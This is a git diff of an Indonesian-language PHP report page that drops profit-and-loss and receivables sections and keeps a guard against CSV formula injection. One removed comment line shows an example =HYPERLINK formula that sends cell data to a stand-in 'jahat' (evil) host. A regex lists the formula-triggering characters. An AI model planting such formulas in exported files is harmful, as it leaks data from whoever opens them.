@@ -19,11 +19,28 @@ use Symfony\Component\HttpFoundation\StreamedResponse;
 /**
  * Halaman Laporan.
  *
- * Semua angka dihitung on-the-fly dari transaksi (tidak ada tabel ringkasan),
- * sesuai Schema.md §6.
+ * ⚠️ KEPUTUSAN USER (19 Sep 2026):
+ * "laba rugi per spk itu untuk apa karna bagian rugi tadi di hapus, saya
+ *  mengikuti dari user kalau bagian bagian tersebut dihapus apakah tidak
+ *  masalah, karna dari user tidak ada itu seperti pajak, biaya, laba/rugi,
+ *  dan piutang jadi murni input berdasarkan data yang ada."
  *
- * Ekspor CSV memakai endpoint sendiri (bukan paket tambahan) agar tetap
- * ringan. Lihat method `ekspor()`.
+ * Maka laporan HANYA memuat data yang BENAR-BENAR ADA & DIINPUT:
+ *
+ *   1. Ringkasan        — nilai SPK, uang masuk, uang keluar, selisih
+ *   2. Uang Masuk       — per bulan
+ *   3. Uang Keluar      — per bulan
+ *   4. Pengeluaran      — per kategori
+ *   5. Daftar SPK       — nilai & status per SPK
+ *   6. Tenggat SPK      — yang lewat / mendekati tenggat
+ *
+ * DIHAPUS (tidak ada datanya / tidak dipakai perusahaan):
+ *   - Laba-Rugi per SPK   (tidak ada data biaya & laba)
+ *   - Piutang             (tidak ada data pembayaran lengkap)
+ *   - Umur Piutang (aging)
+ *   - Retensi
+ *
+ * Semua angka dihitung on-the-fly dari transaksi (tidak ada tabel ringkasan).
  */
 class Laporan extends Page
 {
@@ -35,7 +52,7 @@ class Laporan extends Page
 
     protected static ?string $navigationLabel = 'Laporan';
 
-    protected static ?string $title = 'Laporan Keuangan';
+    protected static ?string $title = 'Laporan';
 
     protected static ?int $navigationSort = 1;
 
@@ -47,9 +64,6 @@ class Laporan extends Page
         $this->periode = $periode;
     }
 
-    /**
-     * Tanggal awal periode terpilih (null = tanpa batas).
-     */
     protected function tanggalAwal(): ?Carbon
     {
         return $this->periode > 0
@@ -57,9 +71,6 @@ class Laporan extends Page
             : null;
     }
 
-    /**
-     * Query uang masuk sesuai periode.
-     */
     protected function queryMasuk()
     {
         return UangMasuk::query()
@@ -78,17 +89,20 @@ class Laporan extends Page
     protected function getViewData(): array
     {
         // ---------------------------------------------------------
-        // Ringkasan
+        // 1. RINGKASAN
         // ---------------------------------------------------------
         $totalMasuk = (float) $this->queryMasuk()->sum('jumlah');
         $totalKeluar = (float) $this->queryKeluar()->sum('jumlah');
-        $saldo = $totalMasuk - $totalKeluar;
+        $selisih = $totalMasuk - $totalKeluar;
 
         $masukDariSpk = (float) $this->queryMasuk()->whereNotNull('spk_id')->sum('jumlah');
         $masukLuarSpk = (float) $this->queryMasuk()->whereNull('spk_id')->sum('jumlah');
 
+        $nilaiSpk = (float) Spk::sum('nilai_spk');
+        $belumDiterima = $nilaiSpk - (float) UangMasuk::whereNotNull('spk_id')->sum('jumlah');
+
         // ---------------------------------------------------------
-        // Uang masuk per bulan
+        // 2 & 3. UANG MASUK / KELUAR PER BULAN
         // ---------------------------------------------------------
         $masukPerBulan = $this->queryMasuk()
             ->selectRaw("DATE_FORMAT(tanggal, '%Y-%m') as bulan, COUNT(*) as jumlah_transaksi, SUM(jumlah) as total")
@@ -122,212 +136,112 @@ class Laporan extends Page
         });
 
         // ---------------------------------------------------------
-        // Pengeluaran per kategori
+        // 4. PENGELUARAN PER KATEGORI
         // ---------------------------------------------------------
         $perKategori = $this->queryKeluar()
             ->selectRaw('kategori, COUNT(*) as jumlah_transaksi, SUM(jumlah) as total')
             ->groupBy('kategori')
             ->orderByDesc('total')
-            ->get();
-
-        // ---------------------------------------------------------
-        // Laba-rugi per SPK
-        //
-        // `piutang` di sini adalah PIUTANG LANCAR (retensi ditahan tidak
-        // dihitung). `retensi_ditahan` ditampilkan terpisah agar transparan.
-        // ---------------------------------------------------------
-        $labaRugiSpk = Spk::query()
-            ->with('mitra')
-            ->withSum('uangMasuk as total_masuk', 'jumlah')
-            ->withSum('uangKeluar as total_keluar', 'jumlah')
             ->get()
-            ->map(function (Spk $spk): array {
-                $penerimaan = (float) ($spk->total_masuk ?? 0);
+            ->map(function ($row): array {
+                $enum = $row->kategori instanceof KategoriPengeluaran
+                    ? $row->kategori
+                    : KategoriPengeluaran::tryFrom((string) $row->kategori);
 
                 return [
-                    'nomor_spk' => $spk->nomor_spk,
-                    'pekerjaan' => $spk->nama_pekerjaan,
-                    'mitra' => $spk->mitra?->nama,
-                    'nilai_spk' => (float) $spk->nilai_spk,
-                    'penerimaan' => $penerimaan,
-                    'biaya' => (float) ($spk->total_keluar ?? 0),
-                    'laba' => $penerimaan - (float) ($spk->total_keluar ?? 0),
-                    'piutang' => $spk->piutangDari($penerimaan),
-                    'retensi_ditahan' => $spk->retensiDitahan(),
+                    'label' => $enum?->label() ?? ($row->kategori ?: 'Tanpa kategori'),
+                    'jumlah_transaksi' => (int) $row->jumlah_transaksi,
+                    'total' => (float) $row->total,
                 ];
-            })
-            ->sortByDesc('laba')
-            ->values();
+            });
 
         // ---------------------------------------------------------
-        // Piutang (SPK belum lunas) + umur piutang (aging)
+        // 5. DAFTAR SPK (nilai & status)
         // ---------------------------------------------------------
-        $piutang = Spk::query()
-            ->with('mitra')
+        $daftarSpk = Spk::query()
+            ->with(['mitra', 'subkon'])
             ->withSum('uangMasuk as total_masuk', 'jumlah')
+            ->orderByDesc('tanggal_spk')
             ->get()
-            ->map(function (Spk $spk): array {
-                $diterima = (float) ($spk->total_masuk ?? 0);
-
-                return [
-                    'nomor_spk' => $spk->nomor_spk,
-                    'pekerjaan' => $spk->nama_pekerjaan,
-                    'mitra' => $spk->mitra?->nama,
-                    'nilai_spk' => (float) $spk->nilai_spk,
-                    'retensi_ditahan' => $spk->retensiDitahan(),
-                    'nilai_tagih' => $spk->nilaiTagih(),
-                    'diterima' => $diterima,
-                    'sisa' => $spk->piutangDari($diterima),
-                    'sisa_hak_penuh' => $spk->sisaHakPenuhDari($diterima),
-                    'status_tagihan' => $spk->status_tagihan?->label() ?? '—',
-                    'umur_hari' => $spk->umurHari(),
-                    'kelompok_umur' => $spk->kategoriUmur(),
-                    'tanggal_spk' => $spk->tanggal_spk?->format('d/m/Y'),
-                ];
-            })
-            ->filter(fn (array $r): bool => $r['sisa'] > 0 || $r['retensi_ditahan'] > 0)
-            ->sortByDesc('sisa')
-            ->values();
+            ->map(fn (Spk $spk): array => [
+                'nomor_spk' => $spk->nomor_spk,
+                'pekerjaan' => $spk->nama_pekerjaan,
+                'mitra' => $spk->mitra?->nama,
+                'tanggal' => $spk->tanggal_spk?->format('d/m/Y'),
+                'nilai_spk' => (float) $spk->nilai_spk,
+                'diterima' => (float) ($spk->total_masuk ?? 0),
+                'belum_diterima' => max(0, $spk->piutangDari((float) ($spk->total_masuk ?? 0))),
+                'status_spk' => $spk->status_spk?->label() ?? '—',
+                'status_tagihan' => $spk->status_tagihan?->label() ?? 'Belum Ditagihkan',
+            ]);
 
         // ---------------------------------------------------------
-        // Umur piutang (aging) — kelompokkan piutang lancar
-        // ---------------------------------------------------------
-        $kelompokUmur = ['0-30', '31-60', '61-90', '>90', 'tanpa-tanggal'];
-
-        $aging = collect($kelompokUmur)->map(function (string $kelompok) use ($piutang): array {
-            $baris = $piutang->where('kelompok_umur', $kelompok);
-
-            return [
-                'kelompok' => $kelompok,
-                'label' => match ($kelompok) {
-                    '0-30' => '0 – 30 hari',
-                    '31-60' => '31 – 60 hari',
-                    '61-90' => '61 – 90 hari',
-                    '>90' => 'Lebih dari 90 hari',
-                    default => 'Tanpa tanggal SPK',
-                },
-                'jumlah_spk' => $baris->count(),
-                'total' => (float) $baris->sum('sisa'),
-                'bahaya' => in_array($kelompok, ['>90'], true),
-                'peringatan' => in_array($kelompok, ['61-90'], true),
-            ];
-        })->values();
-
-        $totalRetensiDitahan = (float) $piutang->sum('retensi_ditahan');
-
-        // ---------------------------------------------------------
-        // Tenggat SPK (dari tanggal_akhir)
+        // 6. TENGGAT SPK
         // ---------------------------------------------------------
         $spkLewatTenggat = Spk::query()
             ->lewatTenggat()
-            ->belumLunas()
             ->with('mitra')
             ->orderBy('tanggal_akhir')
             ->get();
 
         $spkMendekatiTenggat = Spk::query()
             ->mendekatiTenggat()
-            ->belumLunas()
             ->with('mitra')
             ->orderBy('tanggal_akhir')
             ->get();
 
         return [
             'periode' => $this->periode,
+
+            // Ringkasan
             'totalMasuk' => $totalMasuk,
             'totalKeluar' => $totalKeluar,
-            'saldo' => $saldo,
+            'selisih' => $selisih,
             'masukDariSpk' => $masukDariSpk,
             'masukLuarSpk' => $masukLuarSpk,
+            'nilaiSpk' => $nilaiSpk,
+            'belumDiterima' => max(0, $belumDiterima),
+
+            // Rincian
             'perBulan' => $perBulan,
             'perKategori' => $perKategori,
-            'labaRugiSpk' => $labaRugiSpk,
-            'piutang' => $piutang,
-            'aging' => $aging,
-            'totalRetensiDitahan' => $totalRetensiDitahan,
+            'daftarSpk' => $daftarSpk,
             'spkLewatTenggat' => $spkLewatTenggat,
             'spkMendekatiTenggat' => $spkMendekatiTenggat,
+
+            // Jumlah
             'jumlahSpk' => Spk::count(),
             'jumlahMitra' => Mitra::count(),
-            'totalPiutang' => (float) $piutang->sum('sisa'),
+            'jumlahMasuk' => UangMasuk::count(),
+            'jumlahKeluar' => UangKeluar::count(),
         ];
     }
 
     /**
      * Ekspor data laporan ke CSV.
-     *
-     * Dipakai tombol "Ekspor CSV" di halaman. CSV dipilih karena bisa dibuka
-     * di Excel (yang selama ini dipakai perusahaan) tanpa paket tambahan.
      */
     public function ekspor(string $jenis): StreamedResponse
     {
         $data = $this->getViewData();
 
         [$judul, $header, $baris] = match ($jenis) {
-            'cashflow' => [
-                'Laporan Arus Kas',
-                ['Bulan', 'Uang Masuk', 'Uang Keluar', 'Selisih'],
+            'masuk' => [
+                'Laporan Uang Masuk per Bulan',
+                ['Bulan', 'Jumlah Transaksi', 'Total Masuk', 'Total Keluar', 'Selisih'],
                 $data['perBulan']->map(fn (array $r): array => [
                     $r['label'],
+                    $r['jumlah_masuk'],
                     $r['masuk'],
                     $r['keluar'],
                     $r['selisih'],
                 ])->all(),
             ],
-            'kategori' => [
-                'Laporan Pengeluaran per Kategori',
+            'keluar' => [
+                'Laporan Uang Keluar per Kategori',
                 ['Kategori', 'Jumlah Transaksi', 'Total'],
-                $data['perKategori']->map(function ($r): array {
-                    // `kategori` sudah di-cast ke Enum oleh model — ubah ke label.
-                    $kategori = $r->kategori;
-
-                    return [
-                        $kategori instanceof KategoriPengeluaran
-                            ? $kategori->label()
-                            : ($kategori ?? 'Tanpa kategori'),
-                        $r->jumlah_transaksi,
-                        (float) $r->total,
-                    ];
-                })->all(),
-            ],
-            'laba_rugi' => [
-                'Laporan Laba-Rugi per SPK',
-                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Nilai SPK', 'Penerimaan', 'Biaya', 'Laba/Rugi', 'Piutang Lancar', 'Retensi Ditahan'],
-                $data['labaRugiSpk']->map(fn (array $r): array => [
-                    $r['nomor_spk'],
-                    $r['pekerjaan'],
-                    $r['mitra'] ?? '—',
-                    $r['nilai_spk'],
-                    $r['penerimaan'],
-                    $r['biaya'],
-                    $r['laba'],
-                    $r['piutang'],
-                    $r['retensi_ditahan'],
-                ])->all(),
-            ],
-            'piutang' => [
-                'Laporan Piutang SPK',
-                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Tanggal SPK', 'Umur (hari)', 'Nilai SPK', 'Retensi Ditahan', 'Nilai Dapat Ditagih', 'Diterima', 'Piutang Lancar', 'Status Tagihan'],
-                $data['piutang']->map(fn (array $r): array => [
-                    $r['nomor_spk'],
-                    $r['pekerjaan'],
-                    $r['mitra'] ?? '—',
-                    $r['tanggal_spk'] ?? '—',
-                    $r['umur_hari'] ?? '—',
-                    $r['nilai_spk'],
-                    $r['retensi_ditahan'],
-                    $r['nilai_tagih'],
-                    $r['diterima'],
-                    $r['sisa'],
-                    $r['status_tagihan'],
-                ])->all(),
-            ],
-            'aging' => [
-                'Laporan Umur Piutang (Aging)',
-                ['Kelompok Umur', 'Jumlah SPK', 'Total Piutang'],
-                $data['aging']->map(fn (array $r): array => [
+                $data['perKategori']->map(fn (array $r): array => [
                     $r['label'],
-                    $r['jumlah_spk'],
+                    $r['jumlah_transaksi'],
                     $r['total'],
                 ])->all(),
             ],
@@ -358,16 +272,18 @@ class Laporan extends Page
                     ->all(),
             ],
             default => [
-                'Laporan SPK',
-                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Nilai SPK', 'Penerimaan', 'Biaya', 'Laba/Rugi'],
-                $data['labaRugiSpk']->map(fn (array $r): array => [
+                'Laporan Daftar SPK',
+                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Tanggal', 'Nilai SPK', 'Sudah Diterima', 'Belum Diterima', 'Status SPK', 'Status Tagihan'],
+                $data['daftarSpk']->map(fn (array $r): array => [
                     $r['nomor_spk'],
                     $r['pekerjaan'],
                     $r['mitra'] ?? '—',
+                    $r['tanggal'] ?? 'TANPA SPK',
                     $r['nilai_spk'],
-                    $r['penerimaan'],
-                    $r['biaya'],
-                    $r['laba'],
+                    $r['diterima'],
+                    $r['belum_diterima'],
+                    $r['status_spk'],
+                    $r['status_tagihan'],
                 ])->all(),
             ],
         };
@@ -398,20 +314,14 @@ class Laporan extends Page
      *
      * ⚠️ TEMUAN AUDIT KEAMANAN:
      * Kalau sebuah sel dimulai dengan `=`, `+`, `-`, atau `@`, Excel/Calc
-     * menganggapnya RUMUS dan menjalankannya. Contohnya nama pekerjaan
-     * "=HYPERLINK(""http://jahat/?x=""&A1)" bisa mencuri data, dan pada
-     * Excel lama rumus DDE bisa menjalankan perintah.
+     * menganggapnya RUMUS dan menjalankannya. Karena file CSV ini dibuka di
+     * Excel (aplikasi yang dipakai perusahaan), nilai dari database HARUS
+     * dinetralkan dulu.
      *
-     * Karena file CSV ini dibuka di Excel (aplikasi yang dipakai
-     * perusahaan), nilai dari database HARUS dinetralkan dulu.
-     *
-     * Cara: beri awalan apostrof (`'`) pada nilai teks yang diawali
-     * karakter berbahaya. Excel akan menampilkannya sebagai teks biasa.
-     * Angka asli (int/float) TIDAK disentuh supaya tetap bisa dihitung.
+     * Angka asli (int/float) TIDAK disentuh supaya tetap bisa dijumlahkan.
      */
     private static function amanCsv(mixed $nilai): mixed
     {
-        // Angka & null: biarkan apa adanya (aman, dan tetap bisa dijumlahkan).
         if ($nilai === null || is_int($nilai) || is_float($nilai)) {
             return $nilai;
         }
@@ -422,8 +332,6 @@ class Laporan extends Page
             return $teks;
         }
 
-        // Karakter yang memicu rumus di Excel/Calc.
-        // Termasuk TAB (0x09) & CR (0x0D) karena bisa dipakai menyusupkan.
         if (preg_match('/^[=+\-@\t\r]/', $teks) === 1) {
             return "'".$teks;
         }
@@ -431,9 +339,6 @@ class Laporan extends Page
         return $teks;
     }
 
-    /**
-     * Ringkasan singkat untuk ditampilkan di header.
-     */
     public function getSubheading(): ?string
     {
         return match ($this->periode) {
